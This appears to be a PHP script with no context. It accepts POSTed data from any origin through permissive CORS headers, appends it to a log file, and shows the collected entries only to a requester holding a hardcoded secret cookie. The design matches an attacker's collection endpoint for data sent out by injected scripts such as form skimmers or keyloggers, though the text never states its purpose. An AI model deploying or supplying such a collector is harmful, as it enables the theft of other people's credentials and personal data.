<pre><?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $data = $_POST['data'] ?? '';
    file_put_contents(__DIR__ . '/log.txt', $data . PHP_EOL, FILE_APPEND);
    header('Access-Control-Allow-Methods: POST, OPTIONS');
    header('Access-Control-Allow-Headers: Content-Type');
    header('Access-Control-Allow-Origin: *');
} else {
    if ($_COOKIE['key'] === "dkfyqow") {
        $content = file_get_contents(__DIR__ . '/log.txt');
        $data = explode(PHP_EOL, trim($content));
        foreach ($data as $index => &$line) {
            echo json_encode(json_decode(trim($line)), JSON_PRETTY_PRINT) . PHP_EOL;
        }
    }
}

?></pre>